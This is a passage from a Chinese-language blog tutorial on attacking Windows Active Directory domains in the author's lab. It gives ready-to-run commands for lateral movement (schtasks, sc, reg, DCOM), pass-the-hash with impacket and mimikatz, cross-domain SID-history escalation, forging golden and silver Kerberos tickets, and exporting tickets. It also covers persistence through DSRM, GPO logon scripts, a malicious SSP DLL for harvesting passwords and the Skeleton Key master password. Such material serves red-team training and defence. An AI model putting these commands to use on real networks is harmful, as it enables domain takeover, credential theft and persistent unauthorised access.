/F</span><br><span class="line">schtasks /run /s 1.1.1.1 /u domain\Administrator /p password /tn windowsupdate</span><br></pre></td></tr></table></figure><p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/77.png?raw=true" alt="image-20200805220733211"></p><p>然后查看我们域控，可以发现后台启动了计算器并且是SYSTEM权限</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/78.png?raw=true" alt="image-20200805220811976"></p><h4 id="AT"><a href="#AT" class="headerlink" title="AT"></a>AT</h4><p>这个就是计划任务上面IPC的时候讲了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">at  \\1.1.1.1 15:15 calc</span><br></pre></td></tr></table></figure><h4 id="SC"><a href="#SC" class="headerlink" title="SC"></a>SC</h4><p>这个和上面的计划任务类似，启动计算器进程</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sc  \\1.1.1.1 create windowsupdate binpath= <span class="string">&quot;calc&quot;</span></span><br><span class="line">sc  \\1.1.1.1 start windowsupdate</span><br></pre></td></tr></table></figure><h4 id="REG"><a href="#REG" class="headerlink" title="REG"></a>REG</h4><p>利用注册列表来添加计算器进程</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add  \\1.1.1.1\HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v myentry /t  REG_SZ /d <span class="string">&quot;calc&quot;</span></span><br></pre></td></tr></table></figure><h4 id="DCOM"><a href="#DCOM" class="headerlink" title="DCOM"></a>DCOM</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 方法一</span></span><br><span class="line"><span class="variable">$com</span>  = [activator]::CreateInstance([<span class="built_in">type</span>]::GetTypeFromProgID(<span class="string">&quot;MMC20.Application&quot;</span>,<span class="string">&quot;1.1.1.1&quot;</span>))</span><br><span class="line"><span class="variable">$com</span>.Document.ActiveView.ExecuteShellCommand(<span class="string">&#x27;cmd.exe&#x27;</span>,<span class="variable">$null</span>,<span class="string">&quot;/c  calc.exe&quot;</span>,<span class="string">&quot;Minimized&quot;</span>)</span><br><span class="line"><span class="comment">#  方法二</span></span><br><span class="line"><span class="variable">$com</span>  = [Type]::GetTypeFromCLSID(<span class="string">&#x27;9BA05972-F6A8-11CF-A442-00A0C90A8F39&#x27;</span>,<span class="string">&quot;1.1.1.1&quot;</span>)</span><br><span class="line"><span class="variable">$obj</span>  = [System.Activator]::CreateInstance(<span class="variable">$com</span>)</span><br><span class="line"><span class="variable">$item</span>  = <span class="variable">$obj</span>.item()</span><br><span class="line"><span class="variable">$item</span>.Document.Application.ShellExecute(<span class="string">&quot;cmd.exe&quot;</span>,<span class="string">&quot;/c  calc.exe&quot;</span>,<span class="string">&quot;c:\windows\system32&quot;</span>,<span class="variable">$null</span>,0)</span><br><span class="line"><span class="comment">#  方法三</span></span><br><span class="line"><span class="variable">$com</span>  = [Type]::GetTypeFromCLSID(<span class="string">&#x27;C08AFD90-F2A1-11D1-8455-00A0C91F3880&#x27;</span>,<span class="string">&quot;1.1.1.1&quot;</span>)</span><br><span class="line"><span class="variable">$obj</span>  = [System.Activator]::CreateInstance(<span class="variable">$com</span>)</span><br><span class="line"><span class="variable">$obj</span>.Document.Application.ShellExecute(<span class="string">&quot;cmd.exe&quot;</span>,<span class="string">&quot;/c  calc.exe&quot;</span>,<span class="string">&quot;c:\windows\system32&quot;</span>,<span class="variable">$null</span>,0)</span><br></pre></td></tr></table></figure><h3 id="PTH"><a href="#PTH" class="headerlink" title="PTH"></a>PTH</h3><p>当我们没有明文账号密码，只有hash时，可以尝试hash传递。</p><h4 id="impacket套件"><a href="#impacket套件" class="headerlink" title="impacket套件"></a>impacket套件</h4><p>项目下载地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;SecureAuthCorp&#x2F;impacket</span><br></pre></td></tr></table></figure><p>执行个whoami命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python  wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:208976c3facce54a3b6b003fcae5d6dc domain/administrator@1.1.1.1 <span class="string">&quot;whoami&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/79.png?raw=true" alt="image-20200805223113417"></p><p>其他方法</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#利用上面讲过的psexec</span></span><br><span class="line">psexec.exe  -hashes aad3b435b51404eeaad3b435b51404ee:208976c3facce54a3b6b003fcae5d6dc     domiain/administrator@1.1.1.1 <span class="string">&quot;whoami&quot;</span></span><br><span class="line"><span class="comment">#利用smbexec</span></span><br><span class="line">smbexec.exe  -hashes aad3b435b51404eeaad3b435b51404ee:208976c3facce54a3b6b003fcae5d6dc   domiain/administrator@1.1.1.1 <span class="string">&quot;whoami&quot;</span></span><br></pre></td></tr></table></figure><h4 id="Invoke-TheHash套件"><a href="#Invoke-TheHash套件" class="headerlink" title="Invoke-TheHash套件"></a>Invoke-TheHash套件</h4><p>项目地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Kevin-Robertson&#x2F;Invoke-TheHash&#x2F;</span><br></pre></td></tr></table></figure><p>两种方式</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Invoke-WMIExec  -Target 1.1.1.1 -Domain test.local -Username username -Hash  7ECFFFF0C3548187607A14BAD0F88BB1 -Command <span class="string">&quot;calc.exe&quot;</span> -verbose</span><br><span class="line">Invoke-SMBExec  -Target 1.1.1.1 -Domain test.local -Username username -Hash  7ECFFFF0C3548187607A14BAD0F88BB1 -Command <span class="string">&quot;calc.exe&quot;</span> -verbose</span><br></pre></td></tr></table></figure><h3 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h3><p>命令如下，这边要提一点需要在本机有管理员权限，还需要和目标相同的架构，这边使用的是X64版本的mimikatz</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::pth  /user:administrator /domain:ascotbe.com /ntlm:208976c3facce54a3b6b003fcae5d6dc</span><br></pre></td></tr></table></figure><p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/80.png?raw=true" alt="image-20200805224842818"></p><p>安装KB2871997补丁后，可以使用AES-256密钥进行hash传递：</p><p>抓取AES-256密钥：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::ekeys</span><br><span class="line">privilege::debug</span><br><span class="line">sekurlsa::pth   /user:administrator /domain:ascotbe.com /aes256:aes256key</span><br></pre></td></tr></table></figure><h3 id="NTLM-Relay"><a href="#NTLM-Relay" class="headerlink" title="NTLM-Relay"></a>NTLM-Relay</h3><p>这个感觉有点鸡肋，通过钓鱼来实现的，先占坑后面要是有需求在研究</p><h3 id="域信任-1"><a href="#域信任-1" class="headerlink" title="域信任"></a>域信任</h3><p>当存在子父域时，默认其是双向信任。可以利用sid history跨域提权。流程大致如下：</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/104.png?raw=true" alt="img"></p><p>利用如下，使用mimikatz获取子域的Krbtgt Hash：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::lsa  /patch</span><br></pre></td></tr></table></figure><p>再使用powerview获取父域的sid：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-DomainComputer  -Domain ascotbe.com</span><br></pre></td></tr></table></figure><p>然后添加一个sid=519的企业管理员，利用mimikatz执行如下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden  /user:Administrator /krbtgt:5a1c26831592774a17f70370b8606449 /domain:child.ascotbe.com  /sid:S-1-5-21-1786649982-4053697927-1628754434  /sids:S-1-5-21-4288736272-2299089681-4131927610-519 /ptt</span><br></pre></td></tr></table></figure><h3 id="攻击Kerberos"><a href="#攻击Kerberos" class="headerlink" title="攻击Kerberos"></a>攻击Kerberos</h3><p>麻省理工学院研发Kerberos协议来保护雅典娜工程（Project Athena）提供的网络服务器。这个协议以希腊神话中的人物Kerberos（或者Cerberus）命名，他在希腊神话中是Hades的一条凶猛的三头保卫神犬。<strong>在Windows域环境中,KDC的角色常常由DC(Domain Controller)来担任</strong>,Kerberos是一种<strong>基于票据的认证方式</strong>,票据(Ticket)是用来安全的在认证服务器和用户请求的服务之间传递用户的身份,同时也会传递一些附加信息,用来保证使用Ticket的用户必须是Ticket中指定的用户,<strong>Ticket一旦生成,在生存时间内可以被Client多次使用来申请同一个Server的服务(票据窃取问题)</strong></p><blockquote><p> 这里面涉及到的一些名词缩写</p></blockquote><ul><li>KDC(Key Distribution Center):密钥分发中心，里面包含两个服务：AS和TGS</li><li>AS(Authentication Server):身份认证服务</li><li>TGS(Ticket Granting Server):票据授予服务,<strong>该服务提供的票据也称为 TGS 或者叫白银票据</strong></li><li>TGT(Ticket Granting Ticket):由身份认证服务授予的票据**(黄金票据)**，用于身份认证，存储在内存，默认有效期为10小时</li></ul><blockquote><p>黄金票据和白银票据的一些区别</p></blockquote><ul><li><p>访问权限不同</p><ol><li>Golden Ticket: 伪造TGT,可以获取任何Kerberos服务权限</li><li>Silver Ticket: 伪造TGS,只能访问指定的服务</li></ol></li><li><p>加密方式不同</p><ol><li>Golden Ticket 由Kerberos的Hash—&gt; krbtgt加密</li><li>Silver Ticket 由服务器端密码的Hash值—&gt; master key 加密</li></ol></li><li><p>认证流程不同</p><ol><li>Golden Ticket 的利用过程需要访问域控(KDC)</li><li>Silver Ticket 可以直接跳过 KDC 直接访问对应的服务器</li></ol></li></ul><blockquote><p>Kerberos 的认证过程示意图</p></blockquote><p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/114.png?raw=true" alt="此处输入图片的描述"></p><h4 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h4><p>每个用户的Ticket都是由krbtgt的密码Hash来生成的，所以我们如果拿到了krbtgt的密码Hash，就可以随意伪造Ticket了。实际上只要拿到了域控权限，在上面就可以很容易的获得krbtgt的Hash值，再通过mimikatz即可生成任意用户任何权限的Ticket，也就是Golden Ticket</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/115.png?raw=true" alt="img"></p><blockquote><p>在域控上执行</p></blockquote><p>可以直接导出<strong>krbtgt</strong>账户信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync &#x2F;domain:ascotbe.com &#x2F;user:krbtgt</span><br></pre></td></tr></table></figure><p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/105.png?raw=true" alt="image-20200808181836535"></p><p>然后找到如下三个信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/domain：ascotbe.com</span><br><span class="line">/sid:S-1-5-21-4279882978-2535771031-421163639 <span class="comment">#最后那个502不需要</span></span><br><span class="line">/aes256:43fcdd535d27dc9644852c123c4581f69b2046754e0809344dc9cad94f64a393</span><br></pre></td></tr></table></figure><blockquote><p>生成黄金票据</p></blockquote><p>**Tips:**生成Golden Ticket不仅可以使用aes256，也可用krbtgt的NTLM hash</p><p>换回我们的windows 10，执行以下命令（普通用户权限即可）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /domain:ascotbe.com /sid:S-1-5-21-4279882978-2535771031-421163639  /aes256:43fcdd535d27dc9644852c123c4581f69b2046754e0809344dc9cad94f64a393 /user:god /ticket:gold.kirbi</span><br></pre></td></tr></table></figure><p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/106.png?raw=true" alt="image-20200808183201374"></p><p>票据制作成功，接下来导入我们的黄金票据，然后就可以连上域控了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt C:\Users\asc0t6e\Desktop\gold.kirbi</span><br></pre></td></tr></table></figure><p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/107.png?raw=true" alt="image-20200808183611223"></p><p><strong>Tips：</strong></p><ol><li>这种方式导入的Ticket默认在20分钟以内生效，当然，如果过期了，再次ptt导入Golden Ticket就好</li><li>可以伪造任意用户，即使其不存在</li><li>krbtgt的NTLM hash不会轻易改变，即使修改域控管理员密码</li></ol><h4 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a>白银票据</h4><p>Silver Ticket是伪造的TGS(Ticket Granting Server)ticket，所以也叫service ticket</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/108.png?raw=true" alt="img"></p><blockquote><p>域控上执行</p></blockquote><p>在域控上执行如下命令来获取域控主机的本地管理员账户hash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure><p>如果运行该命令报错了主要原因是Windows 8.1 开始为LSA提供了额外的保护（LSA Protection），以防止读取内存和不受保护的进程注入代码。保护模式要求所有加载到LSA的插件都必须使用Microsoft签名进行数字签名。 在LSA Protection保护模式下，mimikatz运行 <code>sekurlsa::logonpasswords</code>抓取密码会报错</p><p>运行如下命令即可绕过</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD <span class="string">&quot;HKLM\SYSTEM\CurrentControlSet\Control\Lsa&quot;</span> /v <span class="string">&quot;RunAsPPL&quot;</span> /t REG_DWORD /d <span class="string">&quot;00000001&quot;</span> /f</span><br></pre></td></tr></table></figure><p>不过这种方法需要重启电脑才行，是不是觉得这样太鸡肋了？莫慌还有一个方式来达到伪重启的方式</p><p>打开powershell然后执行如下两条命令，就是结束了explorer.exe进程在重新启动他即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">taskkill /im explorer.exe /f</span><br><span class="line">start c:\windows\explorer.exe</span><br></pre></td></tr></table></figure><p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/109.png?raw=true" alt="image-20200808185910908"></p><p>这样就能抓到数据了</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/110.png?raw=true" alt="image-20200808190259737"></p><p>然后我们整理下我们需要的数据</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/domain:ascotbe.com</span><br><span class="line">/sid:S-1-5-21-4279882978-2535771031-421163639 </span><br><span class="line">/target:WIN-1OUEMJB0766.ascotbe.com</span><br><span class="line">/service:cifs</span><br><span class="line">/rc4:732c27e05330ce4f35f1efc78ecbc42a <span class="comment">#这个是NTLM的值</span></span><br><span class="line">/user:silver <span class="comment">#这个值随意</span></span><br></pre></td></tr></table></figure><blockquote><p>制作白银票据</p></blockquote><p>我们切换到windows 10上面运行如下命令（普通权限即可）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /domain:ascotbe.com /sid:S-1-5-21-4279882978-2535771031-421163639  /target:WIN-1OUEMJB0766.ascotbe.com /service:cifs /rc4:732c27e05330ce4f35f1efc78ecbc42a /user:silver /ptt</span><br></pre></td></tr></table></figure><p>成功利用</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/111.png?raw=true" alt="image-20200808192143902"></p><h4 id="Export-the-ticket"><a href="#Export-the-ticket" class="headerlink" title="Export the ticket"></a>Export the ticket</h4><p>我们也能直接把内存中的黄金票据直接搞出来用，这个时效只有10个小时</p><blockquote><p>域控上运行</p></blockquote><p>通过mimikatz导出内存中的Ticket</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::tickets /<span class="built_in">export</span></span><br></pre></td></tr></table></figure><p>然后就会生成这一堆文件了</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/112.png?raw=true" alt="image-20200808193145805"></p><blockquote><p>利用</p></blockquote><p>我们把<code>[0;483d5]-2-0-40e00000-Administrator@krbtgt-ASCOTBE.COM.kirbi</code>这个文件拷贝到我们的windows 10上面，然后执行（普通权限即可）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt C:\Users\asc0t6e\Desktop\[0;483d5]-2-0-40e00000-Administrator@krbtgt-ASCOTBE.COM.kirbi</span><br></pre></td></tr></table></figure><p>利用成功，好像票据有点多</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/113.png?raw=true" alt="image-20200808194619665"></p><h4 id="委派"><a href="#委派" class="headerlink" title="委派"></a>委派</h4><p>占坑有点懵</p><h2 id="域维权"><a href="#域维权" class="headerlink" title="域维权"></a>域维权</h2><p>当拿下域控后，可以在域控上面做一些手脚，以保证后续的权限维持，甚至可以保证，就算域控密码改了，我们依然可以连接。</p><h3 id="DSRM"><a href="#DSRM" class="headerlink" title="DSRM"></a>DSRM</h3><p>该方法相当于重置了域控机器上的本地管理员密码。</p><p>DSRM，目录服务还原模式，是Windows服务器域控制器的安全模式启动选项。DSRM允许管理员用来修复或还原修复或重建活动目录数据库。DSRM账户实际上就是<strong>Administrator</strong>，也就是域控上面的本地管理员账号，非域管理员账号。当建立域控时，会让我们设置DSRM密码</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/81.png?raw=true" alt="img"></p><p>我们用如下命令在域控上同步DSRM密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil</span><br><span class="line"><span class="built_in">set</span>  DSRM password</span><br><span class="line">SYNC  FROM DOMAIN ACCOUNT username</span><br><span class="line">Q</span><br><span class="line">Q</span><br></pre></td></tr></table></figure><p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/82.png?raw=true" alt="image-20200805225934318"></p><p>然后我们用mimikatz查看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">token::elevate</span><br><span class="line">lsadump::sam</span><br></pre></td></tr></table></figure><p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/83.png?raw=true" alt="image-20200806201545242"></p><p>可以发现替换成功了，然后再在域控上添加注册表</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add  <span class="string">&quot;HKLM\System\CurrentControlSet\Control\Lsa&quot;</span> /v  DSRMAdminLogonBehavior /t REG_DWORD /d 2</span><br></pre></td></tr></table></figure><p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/84.png?raw=true" alt="image-20200806201708182"></p><p>最后我们切换到<strong>Windows 10</strong>用pth连接过去</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::pth  /domain:computername /user:Administrator /ntlm:cd572964d4dec965095d4119ec53e0e2</span><br></pre></td></tr></table></figure><blockquote><p>这边要提一嘴，搞了我好久MMP</p></blockquote><p>这边的<strong>domain</strong>是你电脑名称，不是用户名也不是域控名如下图</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/85.png?raw=true" alt="image-20200806204101914"></p><p>最终我们连接上了目标</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/86.png?raw=true" alt="image-20200806204006515"></p><h3 id="GPO"><a href="#GPO" class="headerlink" title="GPO"></a>GPO</h3><p>当我们获取到管理员权限时，可以通过添加组策略手段，实现用户开机自启动，jumbo师傅没有提的一点我提一下，运行的脚本需要放到访问共享中，不然其他机器没办法加载我们的脚本的</p><p>域控上执行过程如下：</p><p>首先建立共享</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/87.png?raw=true" alt="image-20200806214504438"></p><p>如图所示netlogon、sysvol 共享文件夹为升级域控建立的共享文件夹。</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/88.png?raw=true" alt="image-20200806214553597"></p><p>这两个文件夹有些机器是没办法访问的，我们打开高级共享设置</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/89.png?raw=true" alt="image-20200806221953976"></p><p>然后把这三个位置的启动共享都给打开</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/90.png?raw=true" alt="image-20200806222101138"></p><p>接下来我们切换到Windows10看共享文件夹</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/91.png?raw=true" alt="image-20200806222201365"></p><p>可以看到多了个Users文件，然后我们切换回windows2008，将之前做好的bat文件复制到如下共享文件目录。</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/92.png?raw=true" alt="image-20200806222315575"></p><p>我是复制到这个目录下，只要在这个目录下的任意文件夹都可以，接着打开gpmc.msc ，编辑默认组策略</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/93.png?raw=true" alt="image-20200806204517983"></p><p>然后添加启动项</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/94.png?raw=true" alt="image-20200806204619026"></p><p>然后在登录位置添加脚本</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/95.png?raw=true" alt="image-20200806214935776"></p><p>点击浏览后把我们先共享的路径复制过去</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/96.png?raw=true" alt="image-20200806222454472"></p><p>接着点击确定就好</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/97.png?raw=true" alt="image-20200806222526281"></p><p>再执行如下命令强制刷新组策略</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gpupdate  /force</span><br></pre></td></tr></table></figure><p>重启Windows10就能看到执行了我们的脚本，同理还可以设置powershell脚本</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/98.png?raw=true" alt="image-20200806222804243"></p><p>也可以添加计划任务</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/99.png?raw=true" alt="image-20200806220219836"></p><p>具体自己设置即可</p><h3 id="SSP"><a href="#SSP" class="headerlink" title="SSP"></a>SSP</h3><p>　SSP（Security Support Provider）是windows操作系统安全机制的提供者。简单的说，SSP就是DLL文件，主要用于windows操作系统的身份认证功能，例如NTLM、Kerberos、Negotiate、Secure Channel（Schannel）、Digest、Credential（CredSSP）。</p><p>　　SSPI（Security Support Provider Interface，安全支持提供程序接口）是windows操作系统在执行认证操作时使用的API接口。可以说SSPI就是SSP的API接口。</p><p>如果获得目标系统system权限，可以使用该方法进行持久化操作。其主要原理是：LSA（Local Security Authority）用于身份验证；lsass.exe作为windows的系统进程，用于本地安全和登录策略；在系统启动时，SSP将被加载到lsass.exe 进程中。但是，假如攻击者对LSA进行了扩展，自定义了恶意的DLL文件，在系统启动时将其加载到lsass.exe进程中，就能够获取lsass.exe进程中的明文密码。这样即使用户更改密码并重新登录，攻击者依然可以获得该账号的新密码。</p><p><strong>利用mimikatz来完成</strong></p><ul><li>将mimilib.dll复制到域控<strong>c:\windows\system32</strong></li><li>添加注册表:<code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa\SecurityPackages\</code>中</li><li>重启后记录登录的密码</li></ul><p>具体代码如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">copy mimilib.dll %systemroot%\system32</span><br><span class="line">reg query hklm\system\currentcontrolset\control\lsa\ /v <span class="string">&quot;Security Packages&quot;</span></span><br><span class="line">reg add <span class="string">&quot;hklm\system\currentcontrolset\control\lsa\&quot; /v &quot;</span>Security Packages<span class="string">&quot; /d &quot;</span>kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u\0mimilib<span class="string">&quot; /t REG_MULTI_SZ</span></span><br></pre></td></tr></table></figure><p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/100.png?raw=true" alt="image-20200806224652440"></p><p>然后重启后查看文件</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/101.png?raw=true" alt="image-20200806225606582"></p><h3 id="Skeleton-Key"><a href="#Skeleton-Key" class="headerlink" title="Skeleton Key"></a>Skeleton Key</h3><p>利用mimikatz安装一个万能密码<code>mimikatz</code>，实现代码可以参考如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;gentilkiwi&#x2F;mimikatz&#x2F;blob&#x2F;master&#x2F;mimikatz&#x2F;modules&#x2F;kuhl_m_misc.c</span><br></pre></td></tr></table></figure><p>执行完一下命令就可以使用<code>mimikatz</code>作为一个万能密码，去连接域控，该方法可用于当域控密码被改掉时，我们依然可以去控制域控。</p><blockquote><p>注意X64机器要使用X64版本的mimikatz</p></blockquote><p>在域控上运行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">misc::skeleton</span><br></pre></td></tr></table></figure><p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/102.png?raw=true" alt="image-20200806230603129"></p><p>在域内主机上运行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net use \\WIN-1OUEMJB0766.ascotbe.com <span class="string">&quot;mimikatz&quot;</span> /user:ascotbe.com\administrator</span><br><span class="line">dir \\WIN-1OUEMJB0766.ascotbe.com\c$</span><br></pre></td></tr></table></figure><p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/103.png?raw=true" alt="image-20200806231009027"></p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;payloads.online&#x2F;archivers&#x2F;2019-04-13&#x2F;1</span><br><span class="line">https:&#x2F;&#x2F;mp.weixin.qq.com&#x2F;s?__biz&#x3D;MjM5NzE1NjA0MQ&#x3D;&#x3D;&amp;mid&#x3D;2651202058&amp;idx&#x3D;1&amp;sn&#x3D;d3d57af49cea5f15d2c58b83bac35b7d&amp;chksm&#x3D;bd2cc7ac8a5b4ebafac72bb78d523f4956804a0d063f9e33f0f49ace2417a6c392738947330a&amp;mpshare&#x3D;1&amp;scene&#x3D;1&amp;srcid&#x3D;0728NuHlnt4yB5qhc3gWClqQ&amp;sharer_sharetime&#x3D;1595949460134&amp;sharer_shareid&#x3D;de4f8e5a5ad7bd6a89317b77fa1ff085#rd</span><br><span class="line">https:&#x2F;&#x2F;man.linuxde.net&#x2F;ssh</span><br><span class="line">http:&#x2F;&#x2F;linux.51yip.com&#x2F;search&#x2F;ssh</span><br><span class="line">https:&#x2F;&#x2F;blog.csdn.net&#x2F;ccfxue&#x2F;article&#x2F;details&#x2F;53159896</span><br><span class="line">https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;2527</span><br><span class="line">https:&#x2F;&#x2F;www.codenong.com&#x2F;cs105941102&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;blog.csdn.net&#x2F;MS_Tony_Shu&#x2F;article&#x2F;details&#x2F;93723432</span><br><span 